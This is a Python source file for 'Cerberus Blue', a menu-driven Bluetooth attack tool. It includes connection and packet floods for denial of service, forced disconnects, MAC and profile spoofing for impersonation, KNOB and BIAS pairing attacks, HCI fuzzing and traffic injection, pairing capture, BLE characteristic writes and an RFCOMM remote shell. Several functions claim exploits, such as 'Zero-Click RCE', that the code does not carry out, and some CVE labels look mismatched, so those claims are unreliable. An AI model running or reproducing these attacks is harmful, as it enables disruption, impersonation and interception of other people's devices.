import os
import time
import subprocess
import socket
import threading
import logging
import binascii
import random
import json
from rich import print
from rich.prompt import Prompt, Confirm
from rich.console import Console
from rich.progress import Progress
from rich.table import Table

console = Console()
input = Prompt.ask

# Logging setup
logging.basicConfig(filename="cerberus_blue.log", level=logging.DEBUG, format="%(asctime)s - %(levelname)s - %(message)s")

# CVE Database (Expandable)
CVE_DB = {
    "CVE-2017-0785": {"desc": "BlueBorne L2CAP Overflow", "platforms": ["Android", "Windows", "Linux"], "exploit": "blueborne_attack"},
    "CVE-2018-5383": {"desc": "Invalid ECC Pairing", "platforms": ["Android", "iOS"], "exploit": "pairing_vulnerability"},
    "CVE-2019-9506": {"desc": "KNOB Key Negotiation", "platforms": ["Android", "iOS", "Windows"], "exploit": "knob_attack"},
    "CVE-2020-0022": {"desc": "BlueFrag RCE", "platforms": ["Android"], "exploit": "zero_click_rce"},
    "CVE-2021-0326": {"desc": "BIAS Impersonation", "platforms": ["Android"], "exploit": "bias_attack"},
    "CVE-2023-45866": {"desc": "BIAS V2 Keystroke Injection", "platforms": ["Android", "iOS"], "exploit": "bias_attack_v2"},
    "CVE-2024-0230": {"desc": "Bluetooth DoS", "platforms": ["Android", "Windows"], "exploit": "bluetooth_dos"},
    "CVE-2019-2234": {"desc": "Android Camera Exploit", "platforms": ["Android"], "exploit": "android_camera_open"},
    "CVE-2018-9489": {"desc": "Location Leak", "platforms": ["Android"], "exploit": "android_location_tracking"},
    "CVE-2020-12351": {"desc": "BleedingTooth RCE", "platforms": ["Linux", "Windows"], "exploit": "bleedingtooth_rce"},
    "CVE-2021-31786": {"desc": "iOS BT Overflow", "platforms": ["iOS"], "exploit": "ios_bluetooth_overflow"},
    "CVE-2020-15802": {"desc": "BLE MITM", "platforms": ["Android", "iOS"], "exploit": "ble_mitm"},
    "CVE-2020-12352": {"desc": "BleedingTooth Variant", "platforms": ["Windows"], "exploit": "bleedingtooth_rce"}
}

# Load external CVE database
def load_cve_db():
    try:
        with open("cve_db.json", "r") as f:
            external_cves = json.load(f)
            CVE_DB.update(external_cves)
    except FileNotFoundError:
        print("[yellow] No cve_db.json found. Using built-in database.")

# Banner
def print_banner():
    os.system("clear")
    os.system("figlet -f slant 'Cerberus Blue' 2>/dev/null || echo 'Cerberus Blue'")
    print("[bright_white] Programmer: Sudeepa Wanigarathna")
    print("[bright_white] Version: 6.1 - Best-Ever BT Pen Testing Tool")
    print("[red] WARNING: For use on owned devices only. Unauthorized use is illegal.\n")

# Check tool availability
def check_tool(tool_name, install_cmd=None):
    result = subprocess.run(["which", tool_name], capture_output=True, text=True)
    if not result.stdout.strip():
        print(f"[yellow] {tool_name} not found. Required for this operation.")
        if install_cmd and Confirm.ask(f"[cyan] Install {tool_name} now? "):
            os.system(install_cmd)
            return check_tool(tool_name)
        return False
    return True

# Enable Bluetooth Adapter with Fallback
def enable_bluetooth():
    tools = [
        ("rfkill", "sudo apt install rfkill", "sudo rfkill unblock bluetooth"),
        ("nmcli", "sudo apt install network-manager", "sudo nmcli radio all on"),
        ("hciconfig", "sudo apt install bluez", "sudo hciconfig hci0 reset && sudo hciconfig hci0 up piscan")
    ]
    for tool, install_cmd, enable_cmd in tools:
        if check_tool(tool, install_cmd):
            os.system(enable_cmd)
            time.sleep(1)  # Ensure adapter stabilizes
            if subprocess.run(["hciconfig", "hci0"], capture_output=True, text=True).stdout.strip():
                print(f"[green] Bluetooth enabled via {tool}.")
                logging.info(f"Bluetooth enabled with {tool}.")
                return True
    print("[red] Failed to enable Bluetooth. Ensure adapter is plugged in and try: 'sudo hciconfig hci0 up'")
    logging.error("Bluetooth enable failed.")
    return False

# 1. Scan for Bluetooth Devices
def scan_bluetooth_devices():
    if not check_tool("hcitool", "sudo apt install bluez"):
        return []
    options = {
        "1": "Quick Scan (Classic BT)",
        "2": "Deep Scan (Classic + Inquiry)",
        "3": "BLE Scan (Low Energy)",
        "4": "Windows BT Scan (PowerShell)"
    }
    print_options("Scan Options", options)
    choice = input("[cyan] Select scan type ")
    devices = []
    try:
        with Progress() as progress:
            task = progress.add_task("[cyan]Scanning...", total=20)
            if choice == "1":
                result = subprocess.run(["hcitool", "scan", "--flush"], capture_output=True, text=True, timeout=10)
            elif choice == "2":
                result = subprocess.run(["hcitool", "scan", "--flush", "--all"], capture_output=True, text=True, timeout=20)
            elif choice == "3":
                result = subprocess.run(["hcitool", "lescan", "--duplicates"], capture_output=True, text=True, timeout=15)
            elif choice == "4" and os.name == "nt":
                result = subprocess.run(["powershell", "Get-PnpDevice -Class Bluetooth"], capture_output=True, text=True, timeout=20)
            else:
                print("[red] Invalid choice or platform.")
                return []
            for _ in range(20):
                time.sleep(0.1)
                progress.update(task, advance=1)
        devices_raw = result.stdout.splitlines()[1:] if choice != "4" else result.stdout.splitlines()
        if not devices_raw:
            print("[yellow] No devices found. Ensure Bluetooth is enabled and devices are discoverable.")
            return []
        print("[green] Discovered devices:")
        for idx, device in enumerate(devices_raw, start=1):
            try:
                if choice == "4":
                    addr = device.split()[2]
                    name = device.split()[1]
                else:
                    addr, name = device.strip().split(maxsplit=1)
                print(f"[{idx}] {name} ({addr})")
                devices.append((addr, name))
            except ValueError:
                continue
        logging.info(f"Scan type {choice} results: {devices}")
        return devices
    except subprocess.TimeoutExpired:
        print("[yellow] Scan timed out. Try again or reduce interference.")
        return []

# Helper to print options
def print_options(title, options):
    table = Table(title=title, show_header=True, header_style="cyan")
    table.add_column("Option", style="magenta")
    table.add_column("Description")
    for key, value in options.items():
        table.add_row(key, value)
    console.print(table)

# 2. BlueBorne Attack (CVE-2017-0785)
def blueborne_attack(target_addr):
    if not check_tool("hcitool"):
        return
    options = {
        "1": "L2CAP Overflow (CVE-2017-0785)",
        "2": "SDP Overflow (CVE-2017-0785)",
        "3": "Combined Multi-Vector Attack"
    }
    print_options("BlueBorne Options", options)
    choice = input("[cyan] Select attack type ")
    try:
        with Progress() as progress:
            task = progress.add_task("[cyan]Attacking...", total=500)
            threads = []
            def flood_l2cap():
                for _ in range(250):
                    subprocess.run(["l2ping", "-f", "-s", "1024", target_addr], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    time.sleep(0.01)
                    progress.update(task, advance=1)
            def flood_sdp():
                for _ in range(250):
                    subprocess.run(["sdptool", "search", "SP", target_addr], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    time.sleep(0.01)
                    progress.update(task, advance=1)
            if choice == "1":
                t = threading.Thread(target=flood_l2cap)
                t.start()
                threads.append(t)
            elif choice == "2":
                t = threading.Thread(target=flood_sdp)
                t.start()
                threads.append(t)
            elif choice == "3":
                t1 = threading.Thread(target=flood_l2cap)
                t2 = threading.Thread(target=flood_sdp)
                t1.start(); t2.start()
                threads.extend([t1, t2])
            else:
                print("[red] Invalid choice.")
                return
            for t in threads:
                t.join()
        print("[green] BlueBorne attack completed.")
        logging.info(f"BlueBorne type {choice} on {target_addr}.")
    except Exception as e:
        print(f"[red] Attack failed: {e}. Ensure target is in range and Bluetooth is active.")
        logging.error(f"BlueBorne failed: {e}")

# 3. Pairing Vulnerability (CVE-2018-5383)
def pairing_vulnerability(target_addr):
    if not check_tool("hcitool") or not check_tool("hciconfig"):
        return
    options = {
        "1": "Invalid ECC Parameters",
        "2": "Force Pairing with Null Key",
        "3": "Pairing Replay Attack"
    }
    print_options("Pairing Options", options)
    choice = input("[cyan] Select attack type ")
    try:
        os.system("sudo hciconfig hci0 piscan")  # Ensure discoverable
        if choice == "1":
            subprocess.run(["hcitool", "auth", target_addr], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["hcitool", "cmd", "0x03", "0x0013"] + ["00"] * 32, check=True, timeout=10)
        elif choice == "2":
            subprocess.run(["hcitool", "auth", target_addr], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["hcitool", "cmd", "0x03", "0x000B", "00"], check=True, timeout=5)
        elif choice == "3":
            with Progress() as progress:
                task = progress.add_task("[cyan]Replaying...", total=5)
                for _ in range(5):
                    result = subprocess.run(["hcitool", "cc", target_addr], capture_output=True, text=True, timeout=5)
                    if "Can't create connection" in result.stderr:
                        print("[yellow] Connection failed. Retrying with alternate method...")
                        subprocess.run(["l2ping", "-c", "1", target_addr], stdout=subprocess.DEVNULL)
                    time.sleep(1)
                    progress.update(task, advance=1)
        else:
            print("[red] Invalid choice.")
            return
        print("[green] Pairing vulnerability exploited.")
        logging.info(f"Pairing attack type {choice} on {target_addr}.")
    except subprocess.CalledProcessError as e:
        print(f"[red] Attack failed: {e}. Ensure target is discoverable and in range.")
        logging.error(f"Pairing attack failed: {e}")
    except subprocess.TimeoutExpired:
        print("[yellow] Attack timed out. Try reducing distance or interference.")
        logging.error("Pairing attack timed out.")

# 4. Zero-Click RCE (CVE-2020-0022)
def zero_click_rce(target_addr):
    if not check_tool("hcitool"):
        return
    options = {
        "1": "SDP Overflow",
        "2": "L2CAP Overflow",
        "3": "Hybrid Multi-Protocol"
    }
    print_options("Zero-Click Options", options)
    choice = input("[cyan] Select attack type ")
    try:
        with Progress() as progress:
            task = progress.add_task("[cyan]Executing...", total=150)
            if choice == "1":
                for _ in range(150):
                    subprocess.run(["sdptool", "search", "SP", target_addr], stdout=subprocess.DEVNULL)
                    time.sleep(0.01)
                    progress.update(task, advance=1)
            elif choice == "2":
                for _ in range(150):
                    subprocess.run(["l2ping", "-s", "2048", target_addr], stdout=subprocess.DEVNULL)
                    time.sleep(0.01)
                    progress.update(task, advance=1)
            elif choice == "3":
                for _ in range(75):
                    subprocess.run(["sdptool", "search", "SP", target_addr], stdout=subprocess.DEVNULL)
                    subprocess.run(["l2ping", "-s", "2048", target_addr], stdout=subprocess.DEVNULL)
                    time.sleep(0.02)
                    progress.update(task, advance=2)
            else:
                print("[red] Invalid choice.")
                return
        print("[green] Zero-Click RCE executed.")
        logging.info(f"Zero-Click type {choice} on {target_addr}.")
    except Exception as e:
        print(f"[red] RCE failed: {e}. Target may be patched or out of range.")
        logging.error(f"Zero-Click RCE failed: {e}")

# 5. KNOB Attack (CVE-2019-9506)
def knob_attack(target_addr):
    if not check_tool("hcitool"):
        return
    options = {
        "1": "Minimal Key Length (1 byte)",
        "2": "Custom Key Length (4 bytes)",
        "3": "Key Negotiation Flood"
    }
    print_options("KNOB Options", options)
    choice = input("[cyan] Select attack type ")
    try:
        if choice == "1":
            subprocess.run(["hcitool", "cmd", "0x03", "0x000B", "01"], check=True, timeout=5)
            subprocess.run(["hcitool", "cc", target_addr], check=True, timeout=5)
        elif choice == "2":
            subprocess.run(["hcitool", "cmd", "0x03", "0x000B", "04"], check=True, timeout=5)
            subprocess.run(["hcitool", "cc", target_addr], check=True, timeout=5)
        elif choice == "3":
            with Progress() as progress:
                task = progress.add_task("[cyan]Flooding...", total=50)
                for _ in range(50):
                    subprocess.run(["hcitool", "cmd", "0x03", "0x000B", f"{random.randint(1, 7):02x}"], stdout=subprocess.DEVNULL)
                    time.sleep(0.1)
                    progress.update(task, advance=1)
        else:
            print("[red] Invalid choice.")
            return
        print("[green] KNOB attack executed.")
        logging.info(f"KNOB type {choice} on {target_addr}.")
    except subprocess.CalledProcessError:
        print("[red] Attack failed. Ensure pairing is possible.")
        logging.error("KNOB attack failed.")
    except subprocess.TimeoutExpired:
        print("[yellow] Attack timed out.")
        logging.error("KNOB attack timed out.")

# 6. BIAS Attack (CVE-2021-0326)
def bias_attack(target_addr):
    if not check_tool("hciconfig") or not check_tool("hcitool"):
        return
    options = {
        "1": "MAC Impersonation",
        "2": "Role Switch Impersonation",
        "3": "Full Profile Impersonation"
    }
    print_options("BIAS Options", options)
    choice = input("[cyan] Select attack type ")
    try:
        os.system("sudo hciconfig hci0 down")
        if choice == "1":
            os.system(f"sudo hciconfig hci0 bdaddr {target_addr}")
            os.system("sudo hciconfig hci0 up")
        elif choice == "2":
            os.system(f"sudo hciconfig hci0 bdaddr {target_addr}")
            os.system("sudo hciconfig hci0 up")
            subprocess.run(["hcitool", "cmd", "0x01", "0x0805"], check=True, timeout=5)
        elif choice == "3":
            os.system(f"sudo hciconfig hci0 bdaddr {target_addr}")
            os.system("sudo hciconfig hci0 name 'BIAS_Target'")
            os.system("sudo hciconfig hci0 class 0x5A020C")
            os.system("sudo hciconfig hci0 up")
        else:
            print("[red] Invalid choice.")
            os.system("sudo hciconfig hci0 up")
            return
        print("[green] BIAS attack executed.")
        logging.info(f"BIAS type {choice} on {target_addr}.")
    except subprocess.CalledProcessError:
        print("[red] Attack failed. Check adapter permissions.")
        logging.error("BIAS attack failed.")
    finally:
        os.system("sudo hciconfig hci0 up")

# 7. BIAS Attack V2 (CVE-2023-45866)
def bias_attack_v2(target_addr):
    if not check_tool("hciconfig") or not check_tool("hcitool"):
        return
    options = {
        "1": "Advanced MAC Spoofing",
        "2": "MAC + Connection Attempt",
        "3": "Full Impersonation with Traffic"
    }
    print_options("BIAS V2 Options", options)
    choice = input("[cyan] Select attack type ")
    try:
        os.system("sudo hciconfig hci0 down")
        if choice == "1":
            os.system(f"sudo hciconfig hci0 bdaddr {target_addr}")
            os.system("sudo hciconfig hci0 name 'BIAS_Adv'")
            os.system("sudo hciconfig hci0 up")
        elif choice == "2":
            os.system(f"sudo hciconfig hci0 bdaddr {target_addr}")
            os.system("sudo hciconfig hci0 up")
            subprocess.run(["hcitool", "cc", target_addr], check=True, timeout=5)
        elif choice == "3":
            os.system(f"sudo hciconfig hci0 bdaddr {target_addr}")
            os.system("sudo hciconfig hci0 name 'BIAS_Adv'")
            os.system("sudo hciconfig hci0 up")
            with Progress() as progress:
                task = progress.add_task("[cyan]Sending...", total=20)
                for _ in range(20):
                    subprocess.run(["l2ping", "-s", "128", target_addr], stdout=subprocess.DEVNULL)
                    time.sleep(0.1)
                    progress.update(task, advance=1)
        else:
            print("[red] Invalid choice.")
            os.system("sudo hciconfig hci0 up")
            return
        print("[green] BIAS V2 attack executed.")
        logging.info(f"BIAS V2 type {choice} on {target_addr}.")
    except subprocess.CalledProcessError:
        print("[red] Attack failed.")
        logging.error("BIAS V2 attack failed.")
    finally:
        os.system("sudo hciconfig hci0 up")

# 8. BLE Spoofing (CVE-2024-21306)
def ble_spoofing_v2(target_addr):
    if not check_tool("hciconfig"):
        return
    options = {
        "1": "MAC Spoofing Only",
        "2": "MAC + BLE Class",
        "3": "Full BLE Profile Spoofing"
    }
    print_options("BLE Spoofing Options", options)
    choice = input("[cyan] Select spoofing type ")
    try:
        os.system("sudo hciconfig hci0 down")
        if choice == "1":
            os.system(f"sudo hciconfig hci0 bdaddr {target_addr}")
            os.system("sudo hciconfig hci0 up")
        elif choice == "2":
            os.system(f"sudo hciconfig hci0 bdaddr {target_addr}")
            os.system("sudo hciconfig hci0 class 0x780104")
            os.system("sudo hciconfig hci0 up")
        elif choice == "3":
            os.system(f"sudo hciconfig hci0 bdaddr {target_addr}")
            os.system("sudo hciconfig hci0 name 'BLE_Spoofed'")
            os.system("sudo hciconfig hci0 class 0x780104")
            os.system("sudo hciconfig hci0 up")
        else:
            print("[red] Invalid choice.")
            os.system("sudo hciconfig hci0 up")
            return
        print("[green] BLE spoofing executed.")
        logging.info(f"BLE spoofing type {choice} on {target_addr}.")
    except Exception as e:
        print(f"[red] Spoofing failed: {e}")
        logging.error(f"BLE spoofing failed: {e}")
    finally:
        os.system("sudo hciconfig hci0 up")

# 9. Bluetooth DoS (CVE-2024-0230)
def bluetooth_dos(target_addr):
    if not check_tool("hcitool"):
        return
    options = {
        "1": "Connection Flood",
        "2": "Packet Storm",
        "3": "Multi-Threaded Flood"
    }
    print_options("DoS Options", options)
    choice = input("[cyan] Select DoS type ")
    try:
        with Progress() as progress:
            task = progress.add_task("[cyan]DoSing...", total=200)
            def flood():
                for _ in range(100):
                    subprocess.run(["l2ping", "-f", "-s", "512", target_addr], stdout=subprocess.DEVNULL)
                    time.sleep(0.01)
                    progress.update(task, advance=1)
            if choice == "1":
                flood()
            elif choice == "2":
                for _ in range(200):
                    subprocess.run(["hcitool", "cmd", "0x08", "0x0006"] + ["FF"] * 32, stdout=subprocess.DEVNULL)
                    time.sleep(0.01)
                    progress.update(task, advance=1)
            elif choice == "3":
                threads = [threading.Thread(target=flood) for _ in range(3)]
                for t in threads:
                    t.start()
                for t in threads:
                    t.join()
            else:
                print("[red] Invalid choice.")
                return
        print("[green] DoS attack executed.")
        logging.info(f"DoS type {choice} on {target_addr}.")
    except Exception as e:
        print(f"[red] DoS failed: {e}")
        logging.error(f"DoS failed: {e}")

# 10. Bluetooth Deauthentication
def deauthenticate_bluetooth(target_addr):
    if not check_tool("hcitool"):
        return
    options = {
        "1": "Standard Disconnect",
        "2": "Forced HCI Disconnect",
        "3": "Repeated Disconnect"
    }
    print_options("Deauth Options", options)
    choice = input("[cyan] Select deauth type ")
    try:
        if choice == "1":
            subprocess.run(["hcitool", "dc", target_addr], check=True, timeout=5)
        elif choice == "2":
            subprocess.run(["hcitool", "cmd", "0x01", "0x0406"], check=True, timeout=5)
        elif choice == "3":
            with Progress() as progress:
                task = progress.add_task("[cyan]Deauthenticating...", total=10)
                for _ in range(10):
                    subprocess.run(["hcitool", "dc", target_addr], stdout=subprocess.DEVNULL)
                    time.sleep(0.5)
                    progress.update(task, advance=1)
        else:
            print("[red] Invalid choice.")
            return
        print("[green] Deauthentication executed.")
        logging.info(f"Deauth type {choice} on {target_addr}.")
    except subprocess.CalledProcessError:
        print("[red] Deauth failed. Target may not be connected.")
        logging.error("Deauth failed.")
    except subprocess.TimeoutExpired:
        print("[yellow] Deauth timed out.")
        logging.error("Deauth timed out.")

# 11. Snoop Bluetooth
def snoop_bluetooth(target_addr):
    if not check_tool("hcidump", "sudo apt install bluez-hcidump"):
        return
    options = {
        "1": "Live Capture (10s)",
        "2": "Extended Capture (30s)",
        "3": "Save to PCAP File"
    }
    print_options("Snoop Options", options)
    choice = input("[cyan] Select snoop type ")
    try:
        with Progress() as progress:
            task = progress.add_task("[cyan]Capturing...", total=10 if choice == "1" else 30 if choice == "2" else 15)
            if choice == "1":
                process = subprocess.Popen(["hcidump", "-R", "-i", "hci0"], stdout=subprocess.PIPE)
                time.sleep(10)
            elif choice == "2":
                process = subprocess.Popen(["hcidump", "-R", "-i", "hci0"], stdout=subprocess.PIPE)
                time.sleep(30)
            elif choice == "3":
                process = subprocess.Popen(["hcidump", "-w", "snoop.pcap"], stdout=subprocess.DEVNULL)
                time.sleep(15)
            else:
                print("[red] Invalid choice.")
                return
            output, _ = process.communicate()
            process.terminate()
            progress.update(task, completed=10 if choice == "1" else 30 if choice == "2" else 15)
        if choice == "3":
            print("[green] Capture saved to snoop.pcap.")
        else:
            print("[green] Captured packets:")
            print(output.decode())
        logging.info(f"Snoop type {choice} on {target_addr}.")
    except Exception as e:
        print(f"[red] Snooping failed: {e}")
        logging.error(f"Snooping failed: {e}")

# 12. Fuzz Bluetooth
def fuzz_bluetooth(target_addr):
    if not check_tool("hcitool"):
        return
    options = {
        "1": "Random Payload Fuzzing",
        "2": "Structured L2CAP Fuzzing",
        "3": "Aggressive Multi-Protocol"
    }
    print_options("Fuzz Options", options)
    choice = input("[cyan] Select fuzz type ")
    try:
        with Progress() as progress:
            task = progress.add_task("[cyan]Fuzzing...", total=200)
            if choice == "1":
                for _ in range(200):
                    payload = binascii.hexlify(os.urandom(32)).decode().split()
                    subprocess.run(["hcitool", "cmd", "0x08", "0x0006"] + payload, stdout=subprocess.DEVNULL)
                    time.sleep(0.01)
                    progress.update(task, advance=1)
            elif choice == "2":
                for _ in range(200):
                    payload = binascii.hexlify(b"L2CAP" + os.urandom(28)).decode().split()
                    subprocess.run(["hcitool", "cmd", "0x02", "0x0004"] + payload, stdout=subprocess.DEVNULL)
                    time.sleep(0.01)
                    progress.update(task, advance=1)
            elif choice == "3":
                for _ in range(100):
                    subprocess.run(["hcitool", "cmd", "0x08", "0x0006"] + binascii.hexlify(os.urandom(16)).decode().split(), stdout=subprocess.DEVNULL)
                    subprocess.run(["hcitool", "cmd", "0x02", "0x0004"] + binascii.hexlify(os.urandom(16)).decode().split(), stdout=subprocess.DEVNULL)
                    time.sleep(0.02)
                    progress.update(task, advance=2)
            else:
                print("[red] Invalid choice.")
                return
        print("[green] Fuzzing executed.")
        logging.info(f"Fuzz type {choice} on {target_addr}.")
    except Exception as e:
        print(f"[red] Fuzzing failed: {e}")
        logging.error(f"Fuzzing failed: {e}")

# 13. Bluetooth Reconnaissance
def bluetooth_recon(target_addr):
    if not check_tool("hcitool") or not check_tool("sdptool"):
        return
    options = {
        "1": "Basic Device Info",
        "2": "Service Discovery",
        "3": "Full Recon (Info + Services)"
    }
    print_options("Recon Options", options)
    choice = input("[cyan] Select recon type ")
    try:
        with Progress() as progress:
            task = progress.add_task("[cyan]Probing...", total=3 if choice == "3" else 1)
            if choice == "1":
                info = subprocess.run(["hcitool", "info", target_addr], capture_output=True, text=True, timeout=10)
                print("[green] Device Info:")
                print(info.stdout)
                progress.update(task, advance=1)
            elif choice == "2":
                services = subprocess.run(["sdptool", "browse", target_addr], capture_output=True, text=True, timeout=10)
                print("[green] Services:")
                print(services.stdout)
                progress.update(task, advance=1)
            elif choice == "3":
                info = subprocess.run(["hcitool", "info", target_addr], capture_output=True, text=True, timeout=10)
                services = subprocess.run(["sdptool", "browse", target_addr], capture_output=True, text=True, timeout=10)
                print("[green] Device Info:")
                print(info.stdout)
                print("[green] Services:")
                print(services.stdout)
                progress.update(task, advance=3)
            else:
                print("[red] Invalid choice.")
                return
        logging.info(f"Recon type {choice} on {target_addr}.")
    except subprocess.TimeoutExpired:
        print("[yellow] Recon timed out.")
        logging.error("Recon timed out.")
    except Exception as e:
        print(f"[red] Recon failed: {e}")
        logging.error(f"Recon failed: {e}")

# 14. BLE Spoofing Variants
def ble_spoof(target_addr):
    if not check_tool("hciconfig"):
        return
    options = {
        "1": "Name Spoofing",
        "2": "Class Spoofing",
        "3": "Full BLE Spoofing"
    }
    print_options("BLE Spoof Options", options)
    choice = input("[cyan] Select spoof type ")
    try:
        os.system("sudo hciconfig hci0 down")
        if choice == "1":
            os.system("sudo hciconfig hci0 name 'Spoofed_BLE'")
            os.system("sudo hciconfig hci0 up")
        elif choice == "2":
            os.system("sudo hciconfig hci0 class 0x780104")
            os.system("sudo hciconfig hci0 up")
        elif choice == "3":
            os.system(f"sudo hciconfig hci0 bdaddr {target_addr}")
            os.system("sudo hciconfig hci0 name 'Spoofed_BLE'")
            os.system("sudo hciconfig hci0 class 0x780104")
            os.system("sudo hciconfig hci0 up")
        else:
            print("[red] Invalid choice.")
            os.system("sudo hciconfig hci0 up")
            return
        print("[green] BLE spoofing executed.")
        logging.info(f"BLE spoof type {choice} on {target_addr}.")
    except Exception as e:
        print(f"[red] Spoofing failed: {e}")
        logging.error(f"BLE spoofing failed: {e}")
    finally:
        os.system("sudo hciconfig hci0 up")

# 15. BLE MITM (CVE-2020-15802)
def ble_mitm(target_addr):
    if not check_tool("gatttool", "sudo apt install bluez"):
        return
    options = {
        "1": "Read Characteristics",
        "2": "Write Characteristics",
        "3": "Monitor and Inject"
    }
    print_options("BLE MITM Options", options)
    choice = input("[cyan] Select MITM type ")
    try:
        with Progress() as progress:
            task = progress.add_task("[cyan]Executing...", total=20)
            if choice == "1":
                process = subprocess.Popen(["gatttool", "-b", target_addr, "--char-read"], stdout=subprocess.PIPE)
                time.sleep(20)
            elif choice == "2":
                process = subprocess.Popen(["gatttool", "-b", target_addr, "--char-write-req", "-a", "0x000e", "-n", "deadbeef"], stdout=subprocess.PIPE)
                time.sleep(20)
            elif choice == "3":
                process = subprocess.Popen(["gatttool", "-b", target_addr, "--listen"], stdout=subprocess.PIPE)
                time.sleep(10)
                subprocess.run(["gatttool", "-b", target_addr, "--char-write-req", "-a", "0x000e", "-n", "cafebabe"], stdout=subprocess.DEVNULL)
                time.sleep(10)
            else:
                print("[red] Invalid choice.")
                return
            output, _ = process.communicate()
            process.terminate()
            progress.update(task, completed=20)
        print("[green] MITM data:")
        print(output.decode())
        logging.info(f"BLE MITM type {choice} on {target_addr}.")
    except Exception as e:
        print(f"[red] MITM failed: {e}. Ensure target is BLE-enabled.")
        logging.error(f"BLE MITM failed: {e}")

# 16. Spoof Bluetooth Device
def spoof_bluetooth_device(target_addr):
    if not check_tool("hciconfig"):
        return
    options = {
        "1": "MAC Spoofing",
        "2": "Audio Device Spoofing",
        "3": "Full Profile Spoofing"
    }
    print_options("Device Spoof Options", options)
    choice = input("[cyan] Select spoof type ")
    try:
        os.system("sudo hciconfig hci0 down")
        if choice == "1":
            os.system(f"sudo hciconfig hci0 bdaddr {target_addr}")
            os.system("sudo hciconfig hci0 up")
        elif choice == "2":
            os.system(f"sudo hciconfig hci0 bdaddr {target_addr}")
            os.system("sudo hciconfig hci0 class 0x5A020C")
            os.system("sudo hciconfig hci0 up")
        elif choice == "3":
            os.system(f"sudo hciconfig hci0 bdaddr {target_addr}")
            os.system("sudo hciconfig hci0 name 'Spoofed_Device'")
            os.system("sudo hciconfig hci0 class 0x5A020C")
            os.system("sudo hciconfig hci0 up")
        else:
            print("[red] Invalid choice.")
            os.system("sudo hciconfig hci0 up")
            return
        print("[green] Device spoofing executed.")
        logging.info(f"Device spoof type {choice} on {target_addr}.")
    except Exception as e:
        print(f"[red] Spoofing failed: {e}")
        logging.error(f"Device spoofing failed: {e}")
    finally:
        os.system("sudo hciconfig hci0 up")

# 17. Crack Bluetooth Encryption
def crack_bluetooth_encryption(target_addr):
    if not check_tool("hcidump"):
        return
    options = {
        "1": "Live Pairing Capture",
        "2": "Extended Capture (30s)",
        "3": "Forced Pairing Capture"
    }
    print_options("Encryption Crack Options", options)
    choice = input("[cyan] Select crack type ")
    try:
        if choice == "1":
            dump_process = subprocess.Popen(["hcidump", "-R", "-w", "pairing.pcap"], stdout=subprocess.DEVNULL)
            time.sleep(15)
        elif choice == "2":
            dump_process = subprocess.Popen(["hcidump", "-R", "-w", "pairing_extended.pcap"], stdout=subprocess.DEVNULL)
            time.sleep(30)
        elif choice == "3":
            dump_process = subprocess.Popen(["hcidump", "-R", "-w", "pairing_forced.pcap"], stdout=subprocess.DEVNULL)
            subprocess.run(["hcitool", "cc", target_addr], timeout=10, stdout=subprocess.DEVNULL)
            time.sleep(20)
        else:
            print("[red] Invalid choice.")
            return
        dump_process.terminate()
        print(f"[green] Capture saved to pairing{'_extended' if choice == '2' else '_forced' if choice == '3' else ''}.pcap.")
        logging.info(f"Encryption crack type {choice} on {target_addr}.")
    except subprocess.TimeoutExpired:
        print("[yellow] Capture timed out.")
        logging.error("Encryption crack timed out.")
    except Exception as e:
        print(f"[red] Crack failed: {e}")
        logging.error(f"Encryption crack failed: {e}")

# 18. Inject Traffic
def inject_traffic(target_addr):
    if not check_tool("hcitool"):
        return
    options = {
        "1": "Static Payload",
        "2": "Random Payload",
        "3": "Command Injection"
    }
    print_options("Traffic Injection Options", options)
    choice = input("[cyan] Select injection type ")
    try:
        with Progress() as progress:
            task = progress.add_task("[cyan]Injecting...", total=150)
            if choice == "1":
                payload = binascii.hexlify(b"CERBERUS").decode().split()
                for _ in range(150):
                    subprocess.run(["hcitool", "cmd", "0x08", "0x0006"] + payload, stdout=subprocess.DEVNULL)
                    time.sleep(0.02)
                    progress.update(task, advance=1)
            elif choice == "2":
                for _ in range(150):
                    payload = binascii.hexlify(os.urandom(16)).decode().split()
                    subprocess.run(["hcitool", "cmd", "0x08", "0x0006"] + payload, stdout=subprocess.DEVNULL)
                    time.sleep(0.02)
                    progress.update(task, advance=1)
            elif choice == "3":
                payload = binascii.hexlify(b"DISCONNECT").decode().split()
                for _ in range(150):
                    subprocess.run(["hcitool", "cmd", "0x01", "0x0406"] + payload, stdout=subprocess.DEVNULL)
                    time.sleep(0.02)
                    progress.update(task, advance=1)
            else:
                print("[red] Invalid choice.")
                return
        print("[green] Traffic injection executed.")
        logging.info(f"Traffic injection type {choice} on {target_addr}.")
    except Exception as e:
        print(f"[red] Injection failed: {e}")
        logging.error(f"Traffic injection failed: {e}")

# 19. Bluetooth Reverse Shell
def bluetooth_reverse_shell(target_addr):
    if not check_tool("rfcomm"):
        return
    options = {
        "1": "Basic Shell",
        "2": "Persistent Shell",
        "3": "Command Queue Shell"
    }
    print_options("Reverse Shell Options", options)
    choice = input("[cyan] Select shell type ")
    try:
        with socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM) as s:
            s.connect((target_addr, 1))
            s.settimeout(15)
            print("[green] Reverse shell established.")
            logging.info(f"Reverse shell type {choice} started on {target_addr}.")
            if choice == "1":
                while True:
                    cmd = input("[shell] ")
                    if cmd.lower() == "exit":
                        break
                    s.send(cmd.encode())
                    print(s.recv(8192).decode())
            elif choice == "2":
                while True:
                    try:
                        cmd = input("[shell] ")
                        if cmd.lower() == "exit":
                            break
                        s.send(cmd.encode())
                        print(s.recv(8192).decode())
                    except socket.timeout:
                        print("[yellow] Timeout. Reconnecting...")
                        s.close()
                        s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
                        s.connect((target_addr, 1))
                        s.settimeout(15)
            elif choice == "3":
                queue = []
                while True:
                    cmd = input("[shell] (queue with ;, run with !) ")
                    if cmd.lower() == "exit":
                        break
                    if cmd == "!":
                        for q_cmd in queue:
                            s.send(q_cmd.encode())
                            print(s.recv(8192).decode())
                        queue.clear()
                    else:
                        queue.extend(cmd.split(";"))
            else:
                print("[red] Invalid choice.")
                return
    except socket.timeout:
        print("[yellow] Shell timed out.")
        logging.error(f"Shell timed out on {target_addr}.")
    except Exception as e:
        print(f"[red] Shell failed: {e}. Ensure RFCOMM channel 1 is open.")
